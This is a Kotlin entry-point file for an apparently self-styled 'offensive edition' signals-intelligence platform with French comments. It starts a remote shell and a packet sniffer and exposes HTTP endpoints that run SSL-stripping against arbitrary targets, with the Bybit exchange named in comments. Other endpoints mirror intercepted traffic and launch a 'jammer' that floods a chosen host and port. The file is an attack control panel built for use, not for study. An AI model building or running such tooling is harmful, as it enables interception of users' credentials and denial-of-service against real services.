package com.fardc.sigint.core

import io.javalin.Javalin
import io.javalin.openapi.plugin.OpenApiPlugin
import java.time.Instant

/**
 * NOYAU SOUVERAIN V2.0 - ULTIMATE PSC (OFFENSIVE EDITION)
 * Orchestration : SIGINT, Stealth, Jamming & SSL-Stripping
 */
fun main(args: Array<String>) {
    println("✅ SOVEREIGN CORE boot OK @ ${Instant.now()}")

    // 1. Initialisation des Sentinelles (Anti-Tamper)
    val gatekeeper = Gatekeeper()
    val killSwitch = KillSwitch()

    if (!gatekeeper.validateAccess("MainKt")) {
        killSwitch.engage()
    }

    // 2. Configuration du port Dashboard (Défaut 7070)
    val port = args.firstOrNull()?.toIntOrNull() ?: System.getenv("PORT")?.toIntOrNull() ?: 7070

    // 3. Instanciation des unités de combat
    val rotator = EncryptionKeyRotator()
    val vault = SecurityVault(rotator)
    val interceptor = FinCapInterception()
    val resilience = NetworkResilience()
    val offensiveScanner = OffensiveScanner()
    val remoteShell = RemoteShell()
    val packetSniffer = PacketSniffer()
    val signalJammer = SignalJammer()
    val signalStealth = SignalStealth()
    val trafficMirror = TrafficMirror()
    val sslStripper = SSLStripper() // Intégration pour test Bybit

    // 🚀 ACTIVATION DES UNITÉS PERSISTANTES (Threads de fond)
    rotator.startRotation()            // Rotation AES-GCM (5 min)
    interceptor.runInterceptionMode()   // Port 8889
    resilience.monitorSystem()          // Port 8888
    remoteShell.startShell(9090)        // Terminal Port 9090
    packetSniffer.startSniffing(9999)   // Sniffer Port 9999

    // 4. Démarrage du Dashboard Souverain (Javalin)
    // .start() maintient le processus Java vivant
    val app = Javalin.create { config ->
        config.plugins.register(OpenApiPlugin { })
    }.start(port)

    println("🛡️ TUNNEL SÉCURISÉ ACTIF SUR LE PORT $port")
    println("📡 ARSENAL COMPLET OPÉRATIONNEL")

    // 5. ENDPOINTS DE CONTRÔLE ET D'ACTION

    // Audit de santé
    app.get("/status") { ctx ->
        val statusData = "FARDC_PSC_SOUVERAIN_LAB_ACTIVE"
        ctx.json(
            mapOf(
                "status" to "COMBAT_READY",
                "encryption" to "AES-256-GCM",
                "secure_token" to vault.encryptData(statusData),
                "active_modules" to listOf(
                    "EncryptionRotator", "SecurityVault", "FinCap", "NetworkResilience",
                    "RemoteShell", "PacketSniffer", "OffensiveScanner", 
                    "SignalJammer", "SignalStealth", "TrafficMirror", "SSLStripper"
                )
            )
        )
    }

    // INTERCEPTION DÉGRADÉE (Bybit Lab)
    app.get("/intercept/secure") { ctx ->
        val target = ctx.queryParam("target") ?: ""
        if (target.isNotEmpty()) {
            val downgraded = sslStripper.downgradeConnection(target)
            signalStealth.stealthConnect(downgraded, 80, "INTERCEPTION_REQ_BBY")
            ctx.result("📡 [STEALTH-STRIP] Cible dégradée : $downgraded. Infiltration furtive lancée.")
        } else {
            ctx.status(400).result("Cible HTTPS manquante.")
        }
    }

    // MIROIR : Duplication discrète
    app.get("/mirror") { ctx ->
        val listen = ctx.queryParam("listen")?.toInt() ?: 8081
        val host = ctx.queryParam("host") ?: ""
        val dPort = ctx.queryParam("port")?.toInt() ?: 80
        val mPort = ctx.queryParam("mirror")?.toInt() ?: 9999
        if (host.isNotEmpty()) {
            trafficMirror.startMirroring(listen, host, dPort, mPort)
            ctx.result("📡 [MIRROR] Pont actif sur port $listen")
        } else {
            ctx.status(400).result("Paramètres miroirs incomplets.")
        }
    }

    // SATURATION : Signal-Jammer
    app.get("/jam/start") { ctx ->
        val target = ctx.queryParam("target") ?: ""
        val tPort = ctx.queryParam("port")?.toIntOrNull() ?: 80
        if (target.isNotEmpty()) {
            signalJammer.startJamming(target, tPort)
            ctx.result("🔥 [JAMMER] Saturation engagée sur $target")
        } else {
            ctx.status(400).result("Cible manquante.")
        }
    }

    app.get("/jam/stop") { ctx ->
        signalJammer.stopJamming()
        ctx.result("🛑 [JAMMER] Opérations cessées.")
    }

    // URGENCE : Kill-Switch
    app.post("/emergency/halt") { ctx ->
        println("[!] ORDRE DE HALT REÇU : PURGE MÉMOIRE...")
        ctx.status(200).result(vault.encryptData("DESTRUCTION_CONFIRMED"))
        killSwitch.engage()
    }
}
